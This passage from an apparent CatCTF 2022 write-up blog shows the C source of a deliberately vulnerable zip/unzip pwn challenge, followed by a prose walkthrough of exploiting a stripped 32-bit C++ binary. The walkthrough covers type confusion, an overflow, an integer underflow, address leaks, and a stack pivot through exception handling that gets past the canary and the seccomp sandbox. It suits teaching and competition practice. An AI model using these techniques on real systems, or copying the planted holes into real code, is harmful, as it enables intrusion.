class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;zlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -o zip zip.c -lz</span></span><br><span class="line"><span class="type">int</span> uid=<span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> changdu;</span><br><span class="line"><span class="type">int</span> c[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">int</span> e,<span class="type">int</span> n)</span>&#123;       <span class="comment">//自己指定指数e</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//先将符号明文转换成字母所对应的ascii码。</span></span><br><span class="line">    <span class="type">char</span> mingwen[<span class="number">100</span>];    <span class="comment">//符号明文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入CDK：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>,mingwen);</span><br><span class="line">    getchar();</span><br><span class="line">    changdu=<span class="built_in">strlen</span>(mingwen);</span><br><span class="line">    <span class="type">int</span> ming[<span class="built_in">strlen</span>(mingwen)];   <span class="comment">//定义符号明文</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(mingwen);i++)&#123;</span><br><span class="line">    ming[i]=mingwen[i];        <span class="comment">//将字母转换成对应的ascii码。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="comment">//开始加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start…………………………\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> zhuan=<span class="number">1</span>;    <span class="comment">//c为加密后的数字密文</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(mingwen);i++)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;e;j++)&#123;</span><br><span class="line">        zhuan=zhuan*ming[i]%n;</span><br><span class="line">        <span class="comment">//zhuan=zhuan%n;</span></span><br><span class="line">       &#125;</span><br><span class="line">       c[i]=zhuan;</span><br><span class="line">       <span class="comment">//printf(&quot;%d&quot;,mi[i]);</span></span><br><span class="line">       zhuan=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c[<span class="number">0</span>]!=<span class="number">149</span>||c[<span class="number">1</span>]!=<span class="number">108</span>||c[<span class="number">2</span>]!=<span class="number">24</span>)<span class="comment">//14910824</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        uid=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">zip</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    uLong flen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* fbuf = <span class="literal">NULL</span>;</span><br><span class="line">    uLong clen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* cbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fileName[<span class="number">0x2560</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%2560s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t open %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 装载源文件数据到缓冲区 */</span></span><br><span class="line">    fseek(file, <span class="number">0L</span>, SEEK_END);    <span class="comment">/* 跳到文件末尾 */</span></span><br><span class="line">    flen = ftell(file);        <span class="comment">/* 获取文件长度 */</span></span><br><span class="line">    fseek(file, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span>((fbuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * flen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fread(fbuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), flen, file);</span><br><span class="line">    <span class="comment">/* 压缩数据 */</span></span><br><span class="line">    clen = compressBound(flen);</span><br><span class="line">    <span class="keyword">if</span>((cbuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * clen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(compress(cbuf, &amp;clen, fbuf, flen) != Z_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Compress %s failed!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;zip file&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%2560s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;wb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t create %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 保存压缩后的数据到目标文件 */</span></span><br><span class="line">    fwrite(&amp;flen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);    <span class="comment">/* 写入源文件长度 */</span></span><br><span class="line">    fwrite(&amp;clen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);    <span class="comment">/* 写入目标数据长度 */</span></span><br><span class="line">    fwrite(cbuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), clen, file);</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fbuf);</span><br><span class="line">    <span class="built_in">free</span>(cbuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unzip</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    uLong flen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* fbuf = <span class="literal">NULL</span>;</span><br><span class="line">    uLong ulen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ubuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fileName[<span class="number">0x2560</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;zip file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t open %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 装载源文件数据到缓冲区 */</span></span><br><span class="line">    fread(&amp;ulen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);   <span class="comment">/* 获取缓冲区大小 */</span></span><br><span class="line">    fread(&amp;flen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);   <span class="comment">/* 获取数据流大小 */</span></span><br><span class="line">    <span class="keyword">if</span>((fbuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * flen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fread(fbuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), flen, file);</span><br><span class="line">    <span class="comment">/* 解压缩数据 */</span></span><br><span class="line">    <span class="keyword">if</span>((ubuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * ulen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uncompress(ubuf, &amp;ulen, fbuf, flen) != Z_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Uncompress %s failed!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;unzip file&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;wb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t create %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 保存解压缩后的数据到目标文件 */</span></span><br><span class="line">    fwrite(ubuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), ulen, file);</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fbuf);</span><br><span class="line">    <span class="built_in">free</span>(ubuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sandbox();</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    encrypt(<span class="number">7</span>,<span class="number">221</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.zip&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.unzip&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.buy root&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> choice;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:zip();<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span>(uid==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                unzip();</span><br><span class="line">            &#125;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:buy();<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="welcome-cat-ctf🎉"><a href="#welcome-cat-ctf🎉" class="headerlink" title="welcome_cat_ctf🎉"></a>welcome_cat_ctf🎉</h3><p>gdb修改glod变量<br>set *0x55555575e388&#x3D;0x8888888<br>然后移动到@下面按下j，向服务器发送flag获取请求即可得到flag</p>
<h3 id="chao-🌿"><a href="#chao-🌿" class="headerlink" title="chao 🌿"></a>chao 🌿</h3><p>感谢winmt师傅投递的题目</p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>首先，祝各位师傅们元旦快乐，2023新的一年挖洞如水喝，拿shell拿到手软！</p>
<p>其实，这个题我自己也没感觉很难，更没想到在这次CATCTF跨年赛上能坚挺到最后，成为Pwn方向唯一一个零解的题，应该是师傅们都忙着跨年陪对象了呜呜呜。如果有师傅在这题上花了太多时间，影响了新年的好心情，winmt在此跪下QAQ</p>
<p>本题在漏洞挖掘方面，考察了去除符号表的C++程序逆向恢复 以及 C++中常见的由虚函数引起的类型混淆漏洞。本题代码量并不大，虽然去除了符号表，但是逆向思路整体还是比较清晰的。弄清逻辑后，类型混淆漏洞应该也不难发现。主要考察点在漏洞利用方面，很容易发现有栈溢出，但是并不好利用，此处需要了解C++异常处理的栈回退机制。关于C++异常机制的Pwn题其实很早就出现过，也并不新奇，但是本题在catch到异常后，直接退出了程序，也不好绕过canary保护，无法栈溢出。不过可调试发现，能够通过栈溢出劫持到异常处理中调用的函数指针，继而通过栈迁移完成利用。</p>
<p>下面给各位师傅们呈上本题的WriteUp，对本题有任何其他想法的师傅，也都欢迎找我一起交流~</p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>本题是一道32位的C++ Pwn题，并且保护全开、去除了符号表。因此，需要先找到类的虚表，方便之后对类的逆向恢复：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/1_fC-s9nzEUu.png" class="">

<p>通过start找到main函数之后，发现直接反编译会有问题（疑似IDA的bug），将报错的0x1FF5处（cout的一部分）nop掉即可成功反编译main函数：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2_dz-lCoA9Ji.png" class="">

<p>可以看到本题开启了沙盒，不过由于其他考点较多，就没有在沙盒考察上增加难度了，只禁用了execve：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/3_RCNEkVPNeC.png" class="">

<p>创建功能：最多创建10次，每次可以创建0和1两种对象存放数据，数据的大小不能超过0x100。 （1）创建类型为0的对象，首先申请一个堆块，将Class_one的虚表地址放在堆块头，输入的内容长度存在偏移0x4的位置，输入的内容通过strdup申请的指针存放在0x8的位置。需要注意的是，strdup调用了strlen获取长度，因此<strong>输入的内容相当于会被\x00截断</strong>：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/4_Q5j54rByUS.png" class="">

<p>创建类型为1的对象，同样会申请一个堆块，将Class_two的虚表地址放在堆块头，输入的内容长度存在偏移0x4的位置，不过还会又创建一个对象，在该对象中存放输入内容的长度以及通过strdup为输入的内容申请的堆块地址，并将该对象存放在为Class_two创建的堆块偏移0x8的位置。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/5_kE-HBzJpVv.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/6_Cb5ZYA3S_u.png" class="">

<p>更新功能：不论是Class_one还是Class_two的对象，都会调用Class_one虚表中的sub_2290函数，由此可以判断：Class_two是Class_one的派生类。在sub_2290函数中，会释放掉偏移为0x8处的堆块，更新长度，并通过strdup为新输入的内容产生新的堆块存放在偏移0x8处。此处存在一个<strong>类型混淆漏洞</strong>：sub_2290函数明显只是针对Class_one的操作，而Class_two更新的时候也会调用这个函数，故产生了类型混淆，<strong>可利用此处漏洞控制size和buf地址</strong>。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/7_8_JsPy6pkb.png" class="">

<p>输出功能：均会调用Class_one类虚表中的sub_22EA函数，其中获取size的时候，会分布调用Class_one和Class_two各自虚表中的相应函数：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/8_FQ4UuUet20.png" class="">

<p>其中，Class_one会用strlen获取偏移为0x8处的buf的长度，而Class_two会获取偏移为8处的对象中开头的size，这更呼应了上一点的类型混淆漏洞的可利用性。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/9_6fjYIGlA2c.png" class="">

<p>这里之后调用alloca动态分配栈，分配的大小是size+10，然后首先strcpy到栈上”Content: “字符串9个字节，再将需要输出的内容从对象中的buf区域（这里与上面获取size类似，Class_one直接获取偏移0x8处的buf，Class_two会获取偏移为8处的对象中偏移为4的buf，可通过类型混淆漏洞利用）strcat到栈上之后的区域（存在<strong>缓冲区溢出</strong>）。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/10_as7YYrSuo3.png" class="">

<p>不过，若是strcat之后buf的长度大于length-1（这里可<strong>利用计算机补码造成整型溢出</strong>），则会用C++异常处理中的throw抛出错误，否则将buf输出出来：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/11_U2lmvAoU24.png" class="">

<p>C++异常处理的catch部分在0x204C处，会输出Error!并通过exit(-1)结束程序：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/12_RCUTyKXG70.png" class="">

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li>首先，根据逆向分析的结果，存在<strong>类型混淆</strong>漏洞，可申请Class_two的对象，并<strong>通过update功能，任意修改size和buf</strong>，并通过display功能，可进行<strong>任意地址读</strong>，且利用display中的strcat可造成<strong>缓冲区溢出</strong>。</li>
<li>泄露libc地址：虽然我们可利用类型混淆漏洞进行任意地址读，但是此题保护全开，我们最开始是拿不到任何地址的。由于每次申请的堆块大小不得超过0x100，故需要先将tcache填满，再free到unsorted bin的堆块中就会有libc残留地址。紧接着，布局<strong>堆风水</strong>（这里需要注意一些细节，此处不赘述了），<strong>使得update申请到的堆块的0x4偏移位置是libc的残留地址，其中仍然存放着libc地址（main_arena+0x40），即可得到libc_base</strong>。</li>
<li>泄露heap地址：有了libc地址之后，虽然main_arena中有heap地址，不过在display中，当strcat没遇到\x00，就会一直拼接，main_arena附近很长一段都没有\x00，这就会直接乱码栈溢出，导致崩溃。因此，这里<strong>利用environ附近有heap段末地址的特性</strong>，泄露heap地址（需要注意避开末尾的\x00）。</li>
<li>泄露PIE地址：在为对象分配的堆中，<strong>开头会存放程序中对应的虚表地址</strong>，可利用此处泄露PIE地址。当然，在libc或ld中找程序相关地址泄露也是可以的。</li>
<li>在上面泄露地址的时候（由于是32位的程序，也可通过<strong>爆破一位程序地址</strong>来泄露，概率1&#x2F;16），虽然已经尽可能保证拼接的长度小，不会直接乱码栈溢出。不过，仍然可能会超出分配的数组本身的大小，通过C++异常处理throw抛出error。这里可以利用<strong>计算机补码</strong>，因为比较的时候是与length-1比较的，故可以<strong>使length为0，这样减1后根据补码的相关知识，就变成了0xffffffff，即最大的数，就可以绕过异常处理了</strong>。</li>
<li>然而，本题是开了canary保护的，虽然我们可以从比如TLS中泄露出canary值，不过<strong>canary末两位一定是00</strong>，这样如果直接将payload发过去，在strcat的时候会被截断。因此，得另辟蹊径绕过canary保护。注意到这里有一个C++的异常处理，<strong>通过栈溢出将返回地址改到try与catch中间的位置（即可被捕获到异常的位置，如下图0x2044处）</strong>，这样就能跳到catch继续执行了。不过，<strong>这里与常规的利用catch栈溢出的思路不同</strong>：因为这里catch之后直接exit了，也有canary保护。</li>
</ol>
<img src="/2023/01/01/Nepnep-CatCTF2022/13_ObNFMn4jgN.png" class="">

<p>当执行到catch中的<strong>cxa_begin_catch</strong>时，会跳转到ebx+0x1c中的地址：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/14_4w_3DhBg8u.png" class="">

<p>而ebx又是esi赋值过来的，esi是ebp-8中的值，是可控的：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/15_W8THz9V-Aa.png" class="">

<p>此时，若<strong>通过缓冲区溢出在ebp写入payload地址-4，ebx+0x1c写入存放着leave; ret的地址，即可栈迁移，绕过canary保护</strong>。需要注意的是，当缓冲区溢出执行的时候，<strong>会将栈上存放buf和length的指针覆盖掉</strong>，这里需要伪造一下，使得其能走到异常处理的throw处。</p>
<p>这里需要用ORW的payload绕过沙盒，也就需要先将payload写入堆中，再栈迁移跳转过去。<strong>然而，此payload中必然会出现\x00，被截断，无法完整地发送过去</strong>。因此，这里我们可以先读入gets的payload，跳转执行。再通过gets读入ORW的payload到某可写地址处，再栈迁移过去即可。</p>
<p>这里还需要考虑到<strong>stdin输入缓冲区</strong>的性质：<strong>当输入缓冲区中开头有\n，则gets&#x2F;fgets这类走输入缓冲区的函数不会再读入数据</strong>（可自行查看相关源码）。因此，我们在之前所有cin读入的操作处，<strong>都用空格作为截断符</strong>，即可避免这个问题，使gets的payload正常读入数据（会先将输入缓冲区中残留的一个空格符写入到目标地址）。</p>
